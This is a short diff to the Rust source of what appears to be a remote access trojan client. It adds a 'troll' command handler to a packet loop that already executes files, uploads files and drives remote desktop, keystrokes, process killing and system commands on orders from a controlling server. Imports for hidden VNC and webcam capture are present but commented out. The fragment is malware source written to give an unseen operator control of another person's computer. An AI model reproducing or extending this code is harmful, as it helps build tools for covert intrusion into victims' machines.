@@ -2,6 +2,7 @@ use crate::features::other::{take_screenshot, client_info, visit_website, show_m
 use crate::features::remote_desktop::{start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process};
 use crate::features::system_commands::system_commands;
+use crate::features::troll::execute_troll_command;
 // use crate::features::webcam::take_webcam;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
@@ -163,6 +164,8 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::ExecuteFile(path))) => file_manager.execute_file(&path).await,
             
             Ok(Some(ClientboundPacket::UploadFile(target_folder, file_data))) => file_manager.upload_file(target_folder, file_data).await,
+
+            Ok(Some(ClientboundPacket::TrollClient(command))) => execute_troll_command(&command),
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
